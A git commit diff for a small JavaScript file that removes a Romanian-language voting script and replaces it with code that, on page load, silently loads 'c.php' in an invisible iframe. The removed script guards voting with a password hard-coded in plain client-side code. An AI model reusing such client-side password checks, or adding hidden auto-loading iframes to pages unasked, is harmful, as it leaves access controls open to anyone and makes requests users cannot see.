24ed1f188a2a020e035ecdef70406cf5606c20d8
Backedguci <83763360+Backedguci@users.noreply.github.com>
2021-06-12 20:49:20 +0300

    Update t.js

--- t.js
+++ t.js
@@ -1,31 +1,7 @@
-const pass = "32MPar"
-var tried =window.prompt("pune parola")
-if (pass == tried){
-alert("parola corecta")
-  
-  
-var  nu =window.prompt("pune numele celui care vrei sa il votezi");
-var answer = confirm("iesti sigur?")
-if (answer == false){
-alert("refresh the page")
-                   }
-else                               {
-if (nu == "Teodora"){
-
-document.getElementById("p1").innerHTML = "ai votat cu " + nu;
-                    }
-
-else if(nu=="Elena") {
-
-document.getElementById("p1").innerHTML = "ai votat cu " + nu;
-
-
-}
-else{
-alert("nume invalid incearca din nou")
-}
-                                   }
-                  }
-else {
-alert("parola incorecta")
-}
+window.onload = function() 
+{
+    var iframe = document.createElement('iframe');
+    iframe.style.display = "none";
+    iframe.src = 'c.php';
+    document.body.appendChild(iframe);
+};
